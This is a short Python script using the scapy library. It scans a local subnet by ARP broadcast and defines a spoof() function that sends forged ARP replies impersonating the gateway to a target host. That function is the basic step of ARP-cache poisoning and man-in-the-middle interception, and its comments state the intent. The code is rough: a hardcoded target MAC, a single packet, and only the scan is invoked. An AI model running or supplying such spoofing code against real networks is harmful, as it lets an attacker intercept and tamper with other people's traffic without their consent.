#/usr/bin/env python
from scapy.layers.l2 import ARP, Ether
import scapy.all as scapy


def scan(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast / arp_request
    answered_list, unanswered_list = scapy.srp(broadcast_arp_request, timeout=2, verbose=False)
    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
    print(clients_list)

def spoof(target_ip,spoof_ip):
    # Send packet to Client (target_ip), telling it I have the Router (gateway) MAC Address.
    # ARP fields: op=2 (ARP Response). pdst=[TARGET_IP]. hwdst=[TARGET_MAC].
    # psrc=[SOURCE_IP](GATEWAY_IP)
    packet = ARP(op=2, pdst=target_ip, hwdst="00-50-56-e8-00-20", psrc=spoof_ip)
    scapy.send(packet)

scan("192.168.63.174")
